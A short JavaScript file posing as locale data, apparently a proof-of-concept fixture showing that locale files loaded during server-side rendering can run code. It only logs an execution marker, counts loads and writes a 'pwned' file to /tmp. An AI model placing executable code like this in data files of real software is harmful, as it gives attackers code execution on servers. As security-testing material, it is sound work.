// Attacker-controlled locale data (lands via i18n.locales[locale].dataPath -> loadLocaleData)
const __attacker = (globalThis.__attacker = globalThis.__attacker || {});
__attacker.loaded = (__attacker.loaded || 0) + 1;
console.log('[ATTACKER-EXEC] marker=SSR-VENUE-7f3c1e load-count=' + __attacker.loaded + ' ts=' + Date.now());
// side effect: touch a file the attacker would target in a real scenario
try { require('node:fs').writeFileSync('/tmp/ssr-venue/attacker-side-effect.txt', 'pwned-by-locale-data\n'); } catch {}
